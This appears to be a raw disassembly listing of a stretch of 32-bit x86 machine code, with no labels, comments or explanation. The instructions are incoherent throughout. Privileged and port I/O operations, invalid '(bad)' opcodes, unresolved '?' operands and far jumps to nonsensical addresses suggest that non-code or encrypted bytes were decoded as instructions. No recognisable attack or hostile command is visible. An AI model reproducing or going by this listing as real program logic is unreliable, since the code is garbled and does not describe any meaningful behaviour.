  41ab04:	into   
  41ab05:	sub    cl,BYTE PTR [esi-0x64cf7059]
  41ab0b:	addr16 mov esp,0x6d3280f8
  41ab11:	jns    0x41ab90
  41ab13:	inc    eax
  41ab14:	xor    eax,0xb06ab5e2
  41ab19:	and    edi,DWORD PTR es:[eax]
  41ab1c:	or     eax,0xecf685a2
  41ab21:	pop    edx
  41ab22:	xor    esp,DWORD PTR [esi+0x48]
  41ab25:	sub    bh,BYTE PTR [ebx-0x70565cba]
  41ab2b:	test   BYTE PTR [edx+0x4639aab9],bl
  41ab31:	nop
  41ab32:	outs   dx,BYTE PTR ds:[esi]
  41ab34:	inc    edx
  41ab35:	xor    al,0x5c
  41ab37:	and    al,0x6c
  41ab39:	sub    eax,0xfeeba6da
  41ab3e:	xor    esp,DWORD PTR [ebx+esi*4-0x1e]
  41ab42:	out    dx,al
  41ab43:	mov    ds:0xf95eb080,eax
  41ab48:	mov    edx,0xfa2ab8e0
  41ab4d:	cwde   
  41ab4e:	push   ds
  41ab4f:	sbb    BYTE PTR [edx],cl
  41ab51:	popa   
  41ab52:	push   esp
  41ab53:	xor    bl,0x21
  41ab56:	inc    ebx
  41ab57:	iret   
  41ab58:	pop    ebx
  41ab59:	and    BYTE PTR [ebp-0x13],ch
  41ab5c:	xor    al,0xae
  41ab5e:	xchg   ecx,eax
  41ab5f:	pop    esp
  41ab60:	sbb    al,0x4b
  41ab62:	stos   DWORD PTR es:[edi],eax
  41ab63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab64:	xchg   esi,eax
  41ab65:	pop    ebp
  41ab66:	and    al,0x18
  41ab68:	xor    DWORD PTR [eax-0x3c],eax
  41ab6b:	adc    bl,BYTE PTR [ecx-0x3b]
  41ab6e:	js     0x41ab68
  41ab70:	xor    esp,esp
  41ab72:	mov    esp,0xb0ade3a4
  41ab77:	shr    DWORD PTR [eax-0x33f35eac],1
  41ab7d:	dec    esp
  41ab7e:	stos   WORD PTR es:[edi],ax
  41ab80:	pop    esp
  41ab81:	jb     0x41ab1d
  41ab83:	lea    esi,[edx+0x4b31c80d]
  41ab89:	test   DWORD PTR [edi+0x6a],ebx
  41ab8c:	cmc    
  41ab8d:	aam    0x8e
  41ab8f:	push   esp
  41ab90:	les    ebx,FWORD PTR [edx+0x55029260]
  41ab96:	adc    al,dh
  41ab98:	imul   ecx,DWORD PTR [esi],0x47
  41ab9b:	push   0xbd730026
  41aba0:	test   al,0x8f
  41aba2:	jne    0x41abe0
  41aba4:	leave  
  41aba5:	jmp    0xd8fbad45
  41abaa:	sbb    eax,0x4d
  41abad:	loopne 0x41ab45
  41abaf:	push   ss
  41abb0:	jl     0x41ab52
  41abb2:	xor    ecx,DWORD PTR [edx]
  41abb4:	xor    bh,BYTE PTR [edx+0x214f148f]
  41abba:	sub    eax,0xd7b49287
  41abbf:	and    cl,0x2
  41abc2:	jo     0x41ac2a
  41abc4:	pop    edi
  41abc5:	outs   dx,DWORD PTR ds:[esi]
  41abc6:	addr16 popf 
  41abc8:	mov    ds:0xa56b54f8,eax
  41abcd:	sbb    ebp,DWORD PTR [esi+ecx*2-0x310e1f2f]
  41abd4:	loop   0x41ab91
  41abd6:	icebp  
  41abd7:	outs   dx,DWORD PTR ds:[esi]
  41abd8:	sbb    eax,0xa9b7ef44
  41abdd:	mov    ebp,0x1ae5257d
  41abe2:	push   ds
  41abe3:	retf   
  41abe4:	xor    eax,0xabbfa88a
  41abe9:	inc    ebp
  41abea:	test   BYTE PTR [ecx+0x1a102a44],0x5d
  41abf1:	xor    al,0x37
  41abf3:	fnsave [edi]
  41abf5:	sbb    eax,0x71623d80
  41abfa:	jge    0x41abc0
  41abfc:	and    esp,DWORD PTR [edi-0x6]
  41abff:	adc    bh,cl
  41ac01:	add    eax,0xdc7e3608
  41ac06:	mov    ds:0xc3811f08,al
  41ac0b:	mov    cl,0xac
  41ac0d:	jg     0x41abf5
  41ac0f:	push   esp
  41ac10:	retf   0x4370
  41ac13:	pop    esi
  41ac14:	fsubr  QWORD PTR [edi]
  41ac16:	mov    cl,0x1f
  41ac18:	les    edx,FWORD PTR [ecx]
  41ac1a:	(bad)  
  41ac1b:	into   
  41ac1c:	jle    0x41ac28
  41ac1e:	jo     0x41ac56
  41ac20:	shr    BYTE PTR [ebx],cl
  41ac22:	ret    
  41ac23:	xor    dl,BYTE PTR [esp+eiz*2+0x6aa2b427]
  41ac2a:	(bad)  
  41ac2b:	push   edi
  41ac2c:	mov    ecx,DWORD PTR [ebx-0x25]
  41ac2f:	lods   al,BYTE PTR ds:[esi]
  41ac30:	push   DWORD PTR [eax+edx*8-0x79]
  41ac34:	sub    edx,DWORD PTR [eax-0x4f]
  41ac37:	mov    ch,bh
  41ac39:	dec    ebx
  41ac3a:	rcr    bl,0xc0
  41ac3d:	pop    edi
  41ac3e:	push   esi
  41ac3f:	rcr    ah,cl
  41ac41:	cmp    esi,DWORD PTR [edx]
  41ac43:	jb     0x41ac02
  41ac45:	mov    BYTE PTR [ecx-0x29],ah
  41ac48:	cmc    
  41ac49:	fdivr  QWORD PTR [ebp-0x4e]
  41ac4c:	xchg   DWORD PTR [eax],eax
  41ac4e:	inc    ebp
  41ac4f:	enter  0x47d4,0x5b
  41ac53:	aaa    
  41ac54:	sub    edx,DWORD PTR [ebx-0x5f]
  41ac57:	icebp  
  41ac58:	or     BYTE PTR [ebx+ecx*4+0x14c9511f],dh
  41ac5f:	cld    
  41ac60:	cdq    
  41ac61:	adc    eax,0xcdb55985
  41ac66:	fisttp DWORD PTR [esi-0x6c]
  41ac69:	xchg   esp,eax
  41ac6a:	sub    ebp,eax
  41ac6c:	mov    ds:0x6f2f12f4,eax
  41ac71:	cmp    BYTE PTR [ecx+0x78],dl
  41ac74:	stc    
  41ac75:	jnp    0x41acae
  41ac77:	scas   eax,DWORD PTR es:[edi]
  41ac78:	and    al,0xd4
  41ac7a:	adc    BYTE PTR ds:0xbc8d98ad,dl
  41ac80:	xchg   esp,eax
  41ac81:	out    dx,eax
  41ac82:	test   al,0x13
  41ac84:	xor    dl,ch
  41ac86:	les    eax,FWORD PTR [eax+ecx*2-0x73]
  41ac8a:	fs jns 0x41ac7e
  41ac8d:	dec    edi
  41ac8e:	push   cs
  41ac8f:	loopne 0x41ac85
  41ac91:	inc    edx
  41ac92:	popf   
  41ac93:	and    BYTE PTR [ecx+0x7d],al
  41ac96:	jp     0x41ac74
  41ac98:	or     eax,0x68d0edef
  41ac9d:	into   
  41ac9e:	daa    
  41ac9f:	push   ecx
  41aca0:	nop
  41aca1:	jg     0x41acf0
  41aca3:	cmp    al,cl
  41aca5:	in     al,0x73
  41aca7:	or     eax,0xc7469d9a
  41acac:	inc    edx
  41acad:	jae    0x41ac8e
  41acaf:	imul   eax,DWORD PTR [edx-0x3563aff7],0x7e25c11b
  41acb9:	out    dx,al
  41acba:	pusha  
  41acbb:	ret    0x7db7
  41acbe:	mov    al,0xfd
  41acc0:	sub    al,0x78
  41acc2:	rcr    BYTE PTR [edi],cl
  41acc4:	(bad)  
  41acc5:	adc    DWORD PTR ds:0xbf6b0b80,edx
  41accb:	xlat   BYTE PTR ds:[ebx]
  41accc:	retf   
  41accd:	arpl   WORD PTR [edx*1+0x4abe6a17],cx
  41acd4:	idiv   BYTE PTR [edx+0x4a]
  41acd7:	mov    eax,ds:0x6edd46a
  41acdc:	mov    dl,0x5a
  41acde:	sbb    eax,0xcfa75744
  41ace3:	mov    edi,0x4d8823fe
  41ace8:	and    ebp,DWORD PTR [eax-0x57]
  41aceb:	js     0x41ad5b
  41aced:	push   ss
  41acee:	arpl   WORD PTR [ecx+0x4],bp
  41acf1:	or     DWORD PTR [esi],ecx
  41acf3:	in     al,dx
  41acf4:	fbstp  TBYTE PTR [edx]
  41acf6:	mov    cl,0x6f
  41acf8:	inc    ebp
  41acf9:	pop    esp
  41acfa:	in     al,dx
  41acfb:	cwde   
  41acfc:	fnstsw WORD PTR [esp+esi*1-0xe]
  41ad00:	pop    esp
  41ad01:	pop    esp
  41ad02:	lods   al,BYTE PTR ds:[esi]
  41ad03:	imul   esi,DWORD PTR [edx+0x74c6062],0xababc2a2
  41ad0d:	lods   al,BYTE PTR ds:[esi]
  41ad0e:	inc    edi
  41ad0f:	sub    ecx,edi
  41ad11:	and    eax,0x177bd72a
  41ad16:	jecxz  0x41ad90
  41ad18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad19:	dec    esp
  41ad1a:	cdq    
  41ad1b:	cmp    BYTE PTR [edi-0x68],dh
  41ad1e:	push   es
  41ad1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad20:	out    0x5f,al
  41ad22:	push   0x1974d873
  41ad27:	imul   esp,esp,0x2f412c30
  41ad2d:	xchg   edx,eax
  41ad2e:	(bad)  
  41ad2f:	push   eax
  41ad30:	stc    
  41ad31:	mov    ds:0x4588fad0,al
  41ad36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad38:	xchg   ecx,eax
  41ad39:	mov    ds:0x9ca786f6,al
  41ad3e:	test   al,0xc6
  41ad40:	jle    0x41ace8
  41ad42:	sbb    eax,0x17539eb4
  41ad47:	int    0x99
  41ad49:	inc    eax
  41ad4a:	jnp    0x41acf1
  41ad4c:	mov    ch,0x82
  41ad4e:	hlt    
  41ad4f:	inc    esi
  41ad50:	and    dl,dh
  41ad52:	mov    ch,0xb3
  41ad54:	pop    ss
  41ad55:	add    ebx,ebp
  41ad57:	test   eax,0x1e985d1a
  41ad5c:	sub    eax,DWORD PTR [ebp-0x5b]
  41ad5f:	(bad)  
  41ad60:	dec    esi
  41ad61:	jmp    0x62f2a484
  41ad66:	retf   
  41ad67:	xchg   BYTE PTR [edi-0x24],ch
  41ad6a:	(bad)  
  41ad6b:	imul   ebp,DWORD PTR [esp+edi*1+0x5540a360],0xedb2fe03
  41ad76:	imul   ebp,DWORD PTR [ecx+0x737715ae],0xfffffffa
  41ad7d:	jbe    0x41add3
  41ad7f:	gs jbe 0x41adfb
  41ad82:	dec    edi
  41ad83:	or     bl,BYTE PTR [ebx-0x5f26fb06]
  41ad89:	mov    ecx,0x9523451d
  41ad8e:	fnsave [ebx+0x5e9236e5]
  41ad94:	pop    ds
  41ad95:	aaa    
  41ad96:	sbb    BYTE PTR [esi+0xfa06c8e],ah
  41ad9c:	inc    ebx
  41ad9d:	push   ss
  41ad9e:	pop    ds
  41ad9f:	test   BYTE PTR [ecx-0x6d],dh
  41ada2:	lea    edi,[edx-0x5c]
  41ada5:	scas   eax,DWORD PTR es:[edi]
  41ada6:	cli    
  41ada7:	jmp    0x41adf0
  41ada9:	sub    al,0x8e
  41adab:	cmp    BYTE PTR [esi+0x51],dh
  41adae:	fdivr  st(5),st
  41adb0:	jg     0x41addb
  41adb2:	push   ebx
  41adb3:	cmp    eax,0x8ac3e3d1
  41adb8:	sahf   
  41adb9:	dec    DWORD PTR [eax]
  41adbb:	repnz inc eax
  41adbd:	or     dh,BYTE PTR [edi+0x6e]
  41adc0:	out    dx,eax
  41adc1:	add    al,0xf6
  41adc3:	arpl   WORD PTR [eax],bx
  41adc5:	std    
  41adc6:	lods   al,BYTE PTR ds:[esi]
  41adc7:	sti    
  41adc8:	mov    ah,0x29
  41adca:	mov    ebp,0xe76a6168
  41adcf:	push   ecx
  41add0:	mov    ds:0x16a4b4f3,eax
  41add5:	popa   
  41add6:	or     eax,0x436cfb06
  41addb:	fwait
  41addc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41addd:	lods   eax,DWORD PTR ss:[esi]
  41addf:	push   ebx
  41ade0:	add    ch,cl
  41ade2:	out    dx,al
  41ade3:	mov    ebp,0x4ee762aa
  41ade8:	ins    DWORD PTR es:[edi],dx
  41ade9:	es jg  0x41ae0b
  41adec:	mov    al,0x2d
  41adee:	dec    eax
  41adef:	mov    edi,DWORD PTR [edx-0x60077bdd]
  41adf5:	inc    ebp
  41adf6:	(bad)  
  41adf7:	jecxz  0x41ae41
  41adf9:	push   ecx
  41adfa:	in     al,dx
  41adfb:	dec    ecx
  41adfc:	mov    BYTE PTR [ecx+0x31],dh
  41adff:	push   ds
  41ae00:	fwait
  41ae01:	cli    
  41ae02:	jae    0x41ae22
  41ae04:	fstp   DWORD PTR [eax+edi*1]
  41ae07:	(bad)  
  41ae08:	jecxz  0x41ae70
  41ae0a:	mov    al,0x6f
  41ae0c:	inc    ebx
  41ae0d:	lock out dx,eax
  41ae0f:	bound  eax,QWORD PTR [edx+eax*4+0x5e98e5ee]
  41ae16:	stc    
  41ae17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae18:	cdq    
  41ae19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae1a:	jne    0x41ad9d
  41ae1c:	fmul   DWORD PTR [eax+0x69443c8e]
  41ae24:	jb     0x41adf9
  41ae26:	xor    esi,ebp
  41ae28:	mov    ds:0x22d37d83,al
  41ae2d:	push   es
  41ae2e:	sub    DWORD PTR [eax],edx
  41ae30:	ja     0x41aeb0
  41ae32:	and    esi,esi
  41ae34:	in     eax,0x24
  41ae36:	xchg   edx,eax
  41ae37:	and    DWORD PTR [edi],esp
  41ae39:	sbb    edx,DWORD PTR [eax-0x6c]
  41ae3c:	sub    esi,esp
  41ae3e:	icebp  
  41ae3f:	ins    BYTE PTR es:[edi],dx
  41ae40:	dec    ebx
  41ae41:	hlt    
  41ae42:	jnp    0x41ae72
  41ae44:	mov    cl,0x0
  41ae46:	or     eax,0xb208b472
  41ae4b:	imul   esp
  41ae4d:	inc    esp
  41ae4e:	stc    
  41ae4f:	push   ebx
  41ae50:	pop    esi
  41ae51:	adc    al,0xe0
  41ae53:	ins    DWORD PTR es:[edi],dx
  41ae54:	inc    esi
  41ae55:	dec    ecx
  41ae56:	or     dh,BYTE PTR [ebx]
  41ae58:	cmp    BYTE PTR [ebx+0x34ebc5fd],ah
  41ae5e:	jns    0x41aede
  41ae60:	add    dh,BYTE PTR [ebp+0x10]
  41ae63:	adc    eax,0xe253894f
  41ae68:	adc    dh,al
  41ae6a:	inc    eax
  41ae6b:	xchg   edi,eax
  41ae6c:	dec    ecx
  41ae6d:	jnp    0x41ae8b
  41ae6f:	mov    ?,edx
  41ae71:	idiv   BYTE PTR [ebx]
  41ae73:	pop    ebp
  41ae74:	ret    
  41ae75:	jmp    0x41ae5d
  41ae77:	pop    edi
  41ae78:	shl    BYTE PTR [edx+edx*2],cl
  41ae7b:	cwde   
  41ae7c:	popf   
  41ae7d:	or     DWORD PTR [eax+eax*8-0x2],ecx
  41ae81:	adc    eax,0x9a24457c
  41ae86:	xor    dh,BYTE PTR [ebp+edi*4+0x5464fee]
  41ae8d:	ins    DWORD PTR es:[edi],dx
  41ae8e:	dec    ebp
  41ae8f:	test   eax,0x3e875f5b
  41ae94:	pop    ds
  41ae95:	mov    dl,0x97
  41ae97:	adc    al,0x2f
  41ae99:	aaa    
  41ae9a:	pop    ebp
  41ae9b:	fidiv  DWORD PTR [edx+0x6da13dd]
  41aea1:	pop    edi
  41aea2:	inc    esi
  41aea3:	xlat   BYTE PTR ds:[ebx]
  41aea4:	out    0x8f,al
  41aea6:	adc    ch,BYTE PTR [ebx+0x2267d1b7]
  41aeac:	push   ds
  41aead:	lods   eax,DWORD PTR cs:[esi]
  41aeaf:	je     0x41aea6
  41aeb1:	xlat   BYTE PTR ds:[ebx]
  41aeb2:	call   0xbab27ade
  41aeb7:	jnp    0x41aef3
  41aeb9:	push   edi
  41aeba:	loop   0x41aeaf
  41aebc:	mov    WORD PTR [ebx],fs
  41aebe:	(bad)  
  41aebf:	jg     0x41aeb5
  41aec1:	sti    
  41aec2:	mov    ecx,0xa8bbf7e8
  41aec7:	addr16 into 
  41aec9:	mov    ?,WORD PTR [eax]
  41aecb:	and    esp,DWORD PTR [ebp-0x31b76355]
  41aed1:	inc    esp
  41aed2:	data16 xchg dh,ah
  41aed5:	dec    ebx
  41aed6:	imul   ebx,DWORD PTR [ecx],0xf62bd9d2
  41aedc:	and    DWORD PTR ds:0x53cf4410,esi
  41aee2:	das    
  41aee3:	sub    ch,BYTE PTR [esi+ecx*2-0x1a]
  41aee7:	adc    BYTE PTR [eax-0x4a685b77],al
  41aeed:	popa   
  41aeee:	ficomp DWORD PTR [ebp+0x675421c7]
  41aef4:	adc    BYTE PTR [eax+0x19],al
  41aef7:	dec    edx
  41aef8:	int3   
  41aef9:	mov    eax,0xfaffebd7
  41aefe:	sbb    DWORD PTR [ebp+0x54],eax
  41af01:	aam    0xde
  41af03:	jg     0x41ae8d
  41af05:	xor    ch,BYTE PTR [ebx-0x6960fb67]
  41af0b:	cmp    DWORD PTR [edi-0x5e6b0c81],eax
  41af11:	cli    
  41af12:	inc    edx
  41af13:	dec    DWORD PTR [esi+eiz*1+0x5]
  41af17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af18:	or     ch,BYTE PTR [edi+0x500e017b]
  41af1e:	add    eax,0x12f94542
  41af23:	mov    dl,0xee
  41af25:	ins    BYTE PTR es:[edi],dx
  41af26:	pop    ebp
  41af27:	mov    ch,0x8e
  41af29:	adc    DWORD PTR [ebx-0x414e150f],edx
  41af2f:	mov    bh,BYTE PTR [ecx-0x3b1b5087]
  41af35:	fbld   TBYTE PTR [ecx-0x2b]
  41af38:	xchg   ecx,eax
  41af39:	(bad)  
  41af3a:	in     eax,dx
  41af3b:	repnz pop ebx
  41af3d:	data16 mov bl,0x79
  41af40:	shr    ah,0xe8
  41af43:	push   ecx
  41af44:	aad    0x8b
  41af46:	mov    esp,0x18dba470
  41af4b:	mov    eax,0x32186395
  41af50:	mov    ss,WORD PTR [ebx]
  41af52:	push   0x78861a55
  41af57:	stos   BYTE PTR es:[edi],al
  41af58:	mov    ds:0x23097d66,al
  41af5d:	push   ds
  41af5e:	jno    0x41aef5
  41af60:	pop    ss
  41af61:	push   cs
  41af62:	push   edi
  41af63:	(bad)  
  41af64:	cmp    BYTE PTR [eax+0x26],bh
  41af67:	leave  
  41af68:	and    ecx,esi
  41af6a:	sbb    ebx,DWORD PTR [eax+0x59]
  41af6d:	fs cld 
  41af6f:	jl     0x41aefc
  41af71:	call   0xaa87:0xe9e8d356
  41af78:	test   DWORD PTR [ebx-0x7e],0x530ac082
  41af7f:	sar    DWORD PTR [edx-0x69fc959a],0xe3
  41af86:	(bad)  
  41af87:	mov    ds,ebx
  41af89:	(bad)  
  41af8a:	xchg   esi,eax
  41af8b:	inc    eax
  41af8c:	push   esp
  41af8d:	popf   
  41af8e:	push   es
  41af8f:	inc    esp
  41af90:	ins    DWORD PTR es:[edi],dx
  41af91:	retf   0x88c4
  41af94:	and    eax,0x87e1db0f
  41af99:	cdq    
  41af9a:	and    esp,esp
  41af9c:	ret    0x4e5d
  41af9f:	jnp    0x41af43
  41afa1:	and    BYTE PTR [ebp-0x30],0xeb
  41afa5:	sbb    DWORD PTR [edi+edx*2-0x61d03f9f],0x1f
  41afad:	jnp    0x41afa9
  41afaf:	fcom   st(4)
  41afb1:	lock fst DWORD PTR [edi]
  41afb4:	mov    DWORD PTR ds:0x7e3e8a75,ebp
  41afba:	and    esi,ecx
  41afbc:	and    eax,0x39e42999
  41afc1:	into   
  41afc2:	jmp    0x2ae3:0xa8ae4dc3
  41afc9:	or     BYTE PTR gs:[edi-0x1619edc6],bh
  41afd0:	mov    ah,0xae
  41afd2:	dec    ebx
  41afd3:	mov    WORD PTR [di+0x9],?
  41afd7:	hlt    
  41afd8:	mov    ebx,0x5f99b2b4
  41afdd:	fwait
  41afde:	jbe    0x41af9a
  41afe0:	push   esp
  41afe1:	dec    ecx
  41afe2:	push   0xffffffda
  41afe4:	jbe    0x41b056
  41afe6:	pop    ebp
  41afe7:	hlt    
  41afe8:	inc    edi
  41afe9:	xor    DWORD PTR [ebx],edx
  41afeb:	jnp    0x41aff0
  41afed:	retf   0x1e24
  41aff0:	pusha  
  41aff1:	enter  0x84fe,0xb4
  41aff5:	push   eax
  41aff6:	pop    ebp
  41aff7:	out    0x57,eax
  41aff9:	imul   cl
  41affb:	push   ds
  41affc:	sbb    al,0x4
  41affe:	(bad)  
  41afff:	and    cl,BYTE PTR [ebx+0x24]
  41b002:	retf   0xb293
  41b005:	cld    
  41b006:	and    edx,DWORD PTR [ecx-0x535ef326]
  41b00c:	int    0xe9
  41b00e:	add    ebx,DWORD PTR [edi-0x1e]
  41b011:	inc    esi
  41b012:	popf   
  41b013:	mov    esp,0xf711e320
  41b018:	inc    ebp
  41b019:	sub    al,0x1e
  41b01b:	xchg   ecx,eax
  41b01c:	test   DWORD PTR [esi],esi
  41b01e:	push   esi
  41b01f:	xor    BYTE PTR [edx-0x2ddf41e0],ah
  41b025:	dec    esp
  41b026:	jp     0x41aff8
  41b028:	push   ebp
  41b029:	sub    ebx,edx
  41b02b:	xor    esi,DWORD PTR [ecx+eax*4+0x21c04b25]
  41b032:	push   ds
  41b033:	mov    ds:0x46068157,al
  41b038:	push   ecx
  41b039:	dec    ebp
  41b03a:	dec    ecx
  41b03b:	push   edx
  41b03c:	mov    ah,ch
  41b03e:	js     0x41b0b6
  41b040:	mov    esp,0x2319d148
  41b045:	pop    ebp
  41b046:	scas   eax,DWORD PTR es:[edi]
  41b047:	fdiv   QWORD PTR [edx+0x7048d367]
  41b04d:	es jle 0x41b086
  41b050:	inc    ecx
  41b052:	xor    DWORD PTR [ecx-0x3973c969],edx
  41b058:	push   es
  41b059:	lahf   
  41b05a:	jge    0x41b0cb
  41b05c:	inc    ebx
  41b05d:	or     cl,ch
  41b05f:	inc    edi
  41b060:	in     al,0x81
  41b062:	out    0x38,al
  41b064:	std    
  41b065:	hlt    
  41b066:	ds sti 
  41b068:	jbe    0x41b0b2
  41b06a:	int    0xab
  41b06c:	sti    
  41b06d:	lahf   
  41b06e:	or     eax,0x502b77d9
  41b073:	mov    es,esp
  41b075:	outs   dx,BYTE PTR ds:[esi]
  41b076:	mov    cl,0xef
  41b078:	and    edi,ebx
  41b07a:	je     0x41b0dd
  41b07c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b07d:	ficomp DWORD PTR [esi]
  41b07f:	sbb    ch,dh
  41b081:	xchg   ecx,eax
  41b082:	pushf  
  41b083:	stos   BYTE PTR es:[edi],al
  41b084:	sub    esi,DWORD PTR [edx+0x3d]
  41b087:	cmc    
  41b088:	push   ss
  41b089:	push   edi
  41b08a:	xlat   BYTE PTR ds:[ebx]
  41b08b:	cmc    
  41b08c:	es mov ecx,0xc0f6dada
  41b092:	fwait
  41b093:	mov    ebx,DWORD PTR [eax+0x9]
  41b096:	out    0xb3,al
  41b098:	dec    esp
  41b099:	mov    bh,0x44
  41b09b:	data16 aam 0xcf
  41b09e:	shl    DWORD PTR [ecx+0x687cca3f],1
  41b0a4:	test   BYTE PTR [ebx-0x50],ch
  41b0a7:	mov    ah,0x57
  41b0a9:	add    cl,BYTE PTR [edx-0x3ab2ace3]
  41b0af:	mov    dh,0xad
  41b0b1:	dec    ecx
  41b0b2:	sub    edx,esp
  41b0b4:	inc    ebp
  41b0b5:	inc    edi
  41b0b6:	xchg   edx,eax
  41b0b7:	jge    0x41b086
  41b0b9:	lea    esp,[edx+0x4109d7bb]
  41b0bf:	inc    ebp
  41b0c0:	lock add ebp,0xffffffa2
  41b0c4:	xor    BYTE PTR ds:0x9367652a,al
  41b0ca:	mov    ah,al
  41b0cc:	scas   al,BYTE PTR es:[edi]
  41b0cd:	out    0x6b,al
  41b0cf:	sbb    eax,0xe8d28b5
  41b0d4:	dec    edi
  41b0d5:	pop    eax
  41b0d6:	test   dh,al
  41b0d8:	or     al,0x5
  41b0da:	dec    ebx
  41b0db:	sub    dl,cl
  41b0dd:	mov    ds:0xee59dbcd,al
  41b0e2:	sahf   
  41b0e3:	loop   0x41b09f
  41b0e5:	in     al,0x45
  41b0e7:	sti    
  41b0e8:	push   es
  41b0e9:	(bad)  
  41b0ea:	aad    0xcd
  41b0ec:	push   edi
  41b0ed:	pusha  
  41b0ee:	mov    ecx,0xa0c2d51c
  41b0f3:	outs   dx,DWORD PTR ds:[esi]
  41b0f4:	(bad)  
  41b0f5:	xchg   esi,eax
  41b0f6:	sbb    DWORD PTR [ebx-0x7efb4dfa],ebx
  41b0fc:	inc    ebx
  41b0fd:	jp     0x41b0c7
  41b0ff:	scas   al,BYTE PTR es:[edi]
  41b100:	in     eax,0x1c
  41b102:	add    al,0x60
  41b104:	mov    bh,0x36
  41b106:	iret   
  41b107:	es and al,0x6c
  41b10a:	cmp    bh,BYTE PTR [edx+esi*2+0x77]
  41b10e:	cs in  al,dx
  41b110:	pop    edx
  41b111:	into   
  41b112:	cmp    DWORD PTR [edx-0x2e],0xffffffb6
  41b116:	rcr    bl,1
  41b118:	addr16 mov dh,0x9b
  41b11b:	mov    ch,0x56
  41b11d:	sbb    al,0x5f
  41b11f:	adc    al,0x6a
  41b121:	sti    
  41b122:	add    edi,DWORD PTR [ebx+0x6fa52f4]
  41b128:	enter  0x8315,0x9
  41b12c:	das    
  41b12d:	mov    ah,BYTE PTR [ebp-0xb]
  41b130:	pop    eax
  41b131:	jns    0x41b0de
  41b133:	push   ebp
  41b134:	push   ebx
  41b135:	fsub   DWORD PTR [eax]
  41b137:	mul    BYTE PTR [eax+0x1b]
  41b13a:	hlt    
  41b13b:	mov    esp,0x491b2639
  41b140:	push   edi
  41b141:	dec    eax
  41b142:	(bad)  
  41b143:	ds nop
  41b145:	pop    es
  41b146:	add    ah,al
  41b148:	push   cs
  41b149:	and    al,0x36
  41b14b:	shl    bl,cl
  41b14d:	in     eax,dx
  41b14e:	imul   esi,DWORD PTR [edi+edi*2],0x137c0de9
  41b155:	pop    es
  41b156:	xor    eax,0xa1d74181
  41b15b:	push   esi
  41b15c:	sbb    bl,dl
  41b15e:	cvtps2pi mm3,QWORD PTR [ecx+eax*2-0x164e2bd6]
  41b166:	xchg   edi,eax
  41b167:	mov    ecx,0x66a921c6
  41b16c:	mov    bh,0x6a
  41b16e:	cli    
  41b16f:	dec    esi
  41b170:	adc    ebp,ecx
  41b172:	jmp    0x41b1bf
  41b174:	adc    BYTE PTR [ebp+0x79],ah
  41b177:	imul   DWORD PTR [eax-0x31eab7d6]
  41b17d:	jne    0x41b120
  41b17f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b180:	sub    eax,0x6069efe2
  41b185:	jnp    0x41b10a
  41b187:	or     al,dh
  41b189:	sar    DWORD PTR [eax-0x6db0c767],0xf2
  41b190:	push   edi
  41b191:	jae    0x41b119
  41b193:	cld    
  41b194:	pop    edx
  41b195:	js     0x41b142
  41b197:	and    BYTE PTR [edi+0x2c0360da],cl
  41b19d:	rcr    BYTE PTR [ebp+0xe],1
  41b1a0:	dec    esi
  41b1a1:	jb     0x41b1cf
  41b1a3:	mov    ecx,0x2593bf30
  41b1a8:	mov    bh,0x70
  41b1aa:	adc    al,0x5f
  41b1ac:	data16 cmc 
  41b1ae:	mov    al,0x96
  41b1b0:	mov    edx,DWORD PTR [esp+ebx*4+0x67]
  41b1b4:	iret   
  41b1b5:	fadd   DWORD PTR [edi]
  41b1b7:	pop    esp
  41b1b8:	pop    esi
  41b1b9:	les    edx,FWORD PTR [edx-0xc]
  41b1bc:	es into 
  41b1be:	sbb    esi,0x48eae570
  41b1c4:	in     al,0x8d
  41b1c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1c7:	push   eax
  41b1c8:	cmp    al,BYTE PTR [esi-0x5840ef04]
  41b1ce:	or     eax,0x6b271206
  41b1d3:	mov    esi,fs
  41b1d5:	cmp    BYTE PTR [di-0x6c],ah
  41b1d9:	scas   al,BYTE PTR es:[edi]
  41b1da:	mov    ?,WORD PTR [ebx+eiz*2]
  41b1dd:	or     al,0xa3
  41b1df:	fild   WORD PTR [edx]
  41b1e1:	test   BYTE PTR [esi+edx*4-0x34d618f5],0xc
  41b1e9:	sbb    DWORD PTR [edi],edx
  41b1eb:	jae    0x41b229
  41b1ed:	(bad)
  41b1f1:	test   al,0x18
  41b1f3:	lea    esp,[edi-0x4206520c]
  41b1f9:	xchg   edi,eax
  41b1fa:	gs nop
  41b1fc:	jp     0x41b24b
  41b1fe:	add    BYTE PTR [edx+ebp*2],ch
  41b201:	fcomp  QWORD PTR [eax+0xa556781]
  41b207:	icebp  
  41b208:	inc    eax
  41b209:	sub    dl,dh
  41b20b:	fwait
  41b20c:	pop    esp
  41b20d:	xor    edi,ebp
  41b20f:	loop   0x41b200
  41b211:	jbe    0x41b19f
  41b213:	pop    edi
  41b214:	pop    edi
  41b215:	or     ch,BYTE PTR [edx+esi*1+0x4f]
  41b219:	aaa    
  41b21a:	adc    bl,BYTE PTR [eax-0x3a]
  41b21d:	ss sub eax,0x9200a709
  41b223:	push   eax
  41b224:	jecxz  0x41b22f
  41b226:	int    0x1d
  41b228:	mov    bl,0x27
  41b22a:	sar    BYTE PTR [esi],0xd2
  41b22d:	adc    ecx,DWORD PTR [esi]
  41b22f:	or     DWORD PTR [esi+0x21b02cf9],esi
  41b235:	cmp    DWORD PTR [edx-0x27],esi
  41b238:	pop    esp
  41b239:	sbb    eax,0xd193cd81
  41b23e:	inc    ebp
  41b23f:	fnstenv [edx-0x41ee6989]
  41b245:	pop    ss
  41b246:	dec    esp
  41b247:	adc    DWORD PTR [eax+0x2f],edx
  41b24a:	out    dx,al
  41b24b:	jns    0x41b267
  41b24d:	mov    ch,0x7c
  41b24f:	cli    
  41b250:	rcr    BYTE PTR [ebx],cl
  41b252:	call   0xdb6:0xe5916e50
